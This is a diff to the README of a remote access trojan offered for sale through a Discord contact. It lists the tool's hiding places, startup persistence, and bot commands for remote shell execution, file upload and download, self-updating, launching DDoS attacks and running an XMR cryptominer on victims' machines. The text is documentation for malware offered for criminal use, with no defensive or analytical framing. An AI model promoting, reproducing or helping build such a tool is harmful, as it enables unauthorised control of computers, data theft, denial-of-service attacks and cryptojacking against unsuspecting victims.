@@ -8,20 +8,28 @@ https://discord.gg/vCdPTjD6rZ - Buy? Dm me.
 * Hidden (Works in /tmp, %temp%)
 * Persistence (Copying to /boot, shell:startup)
 * Tested on Windows and Linux platforms
-* Mining uses half of the CPU
 * DDoS attack uses 'storm' script
 
 # Soon
 * Nmap local network scan
 
 # Bot Commands
-* !sessions                         # List open sessions
-* !exit                             # Close session
-* !shell < cmd >                    # Run command
+* !sessions 					List open sessions
+* !exit 						Exit session
 
+* !info 						Give IP information as Json
+* !check 						Check if miner is running or not
+* !shell < cmd > 				Run command
 
+* !download < link > < name > 	Download file
+* !upload < path > 				Upload file
+* !update 						Update RAT
 
-# Self Commands
-Example:  !shell.127.0.0.1 echo Test
+* !sh-update-script < link > 	Update script only on Linux
+* !win-update-script < Link > 	Update script only on Windows
 
-Example2: !exit.127.0.0.1
+* !ddos	< ip > 					Start DDoS attack
+* !stopddos 					Stop DDoS attack
+
+* !miner < wallet > 			Start XMR miner
+* !stopminer 					Stop miner
